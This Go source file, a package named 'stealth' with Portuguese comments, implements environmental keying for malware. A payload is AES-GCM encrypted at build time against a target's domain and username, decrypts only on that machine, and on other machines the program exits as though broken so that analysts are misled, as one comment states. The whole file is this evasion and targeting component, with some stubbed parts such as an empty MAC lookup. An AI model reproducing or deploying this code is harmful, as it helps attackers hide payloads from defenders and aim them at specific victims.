package stealth

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"strings"
)

// EnvironmentalKey representa uma chave derivada do ambiente
type EnvironmentalKey struct {
	DomainName   string
	Username     string
	ComputerName string
	MACAddress   string
}

// GetEnvironmentalKey obtém chave do ambiente atual
func GetEnvironmentalKey() *EnvironmentalKey {
	return &EnvironmentalKey{
		DomainName:   os.Getenv("USERDOMAIN"),
		Username:     os.Getenv("USERNAME"),
		ComputerName: os.Getenv("COMPUTERNAME"),
		MACAddress:   getMACAddress(),
	}
}

// GenerateKeyFromEnvironment gera chave criptográfica baseada no ambiente
func GenerateKeyFromEnvironment(envKey *EnvironmentalKey) []byte {
	// Concatenar todos os valores
	combined := strings.ToUpper(
		envKey.DomainName +
		envKey.Username +
		envKey.ComputerName +
		envKey.MACAddress,
	)

	// Gerar hash SHA-256
	hash := sha256.Sum256([]byte(combined))
	return hash[:]
}

// IsCorrectEnvironment verifica se está no ambiente alvo
func IsCorrectEnvironment(expectedDomain, expectedUser string) bool {
	envKey := GetEnvironmentalKey()

	// Verificar domínio (case-insensitive)
	if expectedDomain != "" {
		if !strings.EqualFold(envKey.DomainName, expectedDomain) {
			return false
		}
	}

	// Verificar usuário (case-insensitive)
	if expectedUser != "" {
		if !strings.EqualFold(envKey.Username, expectedUser) {
			return false
		}
	}

	return true
}

// DecryptPayloadWithEnvKey descriptografa payload usando chave do ambiente
func DecryptPayloadWithEnvKey(encryptedPayload []byte) ([]byte, error) {
	// Gerar chave baseada no ambiente
	envKey := GetEnvironmentalKey()
	key := GenerateKeyFromEnvironment(envKey)

	// Descriptografar usando AES-256
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(encryptedPayload) < nonceSize {
		return nil, err
	}

	nonce, ciphertext := encryptedPayload[:nonceSize], encryptedPayload[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		// Falha na descriptografia = ambiente errado
		return nil, err
	}

	return plaintext, nil
}

// EncryptPayloadWithEnvKey criptografa payload com chave do ambiente
// Usado durante build para criar payload direcionado
func EncryptPayloadWithEnvKey(payload []byte, targetEnv *EnvironmentalKey) ([]byte, error) {
	key := GenerateKeyFromEnvironment(targetEnv)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := GenerateRandomBytes(gcm.NonceSize())
	ciphertext := gcm.Seal(nonce, nonce, payload, nil)

	return ciphertext, nil
}

// getMACAddress obtém primeiro MAC address da máquina
func getMACAddress() string {
	// Simplificado - em produção, usar net.Interfaces()
	// Por enquanto, retornar vazio
	return ""
}

// GenerateTargetedPayload cria payload que só executa no alvo
func GenerateTargetedPayload(
	payload []byte,
	targetDomain string,
	targetUser string,
) ([]byte, error) {
	// Criar EnvironmentalKey do alvo
	targetEnv := &EnvironmentalKey{
		DomainName:   targetDomain,
		Username:     targetUser,
		ComputerName: "", // Deixar vazio para não restringir
		MACAddress:   "",
	}

	// Criptografar payload com chave do alvo
	return EncryptPayloadWithEnvKey(payload, targetEnv)
}

// VerifyEnvironmentOrExit verifica ambiente e sai se não for o correto
func VerifyEnvironmentOrExit(expectedDomain, expectedUser string) {
	if !IsCorrectEnvironment(expectedDomain, expectedUser) {
		// Não é o ambiente alvo - simular erro e sair
		// (Para o analista parecer um programa quebrado)
		os.Exit(1)
	}
}

// GetEnvironmentFingerprint retorna fingerprint único do ambiente
func GetEnvironmentFingerprint() string {
	envKey := GetEnvironmentalKey()
	hash := GenerateKeyFromEnvironment(envKey)
	return hex.EncodeToString(hash[:16]) // Primeiros 16 bytes
}
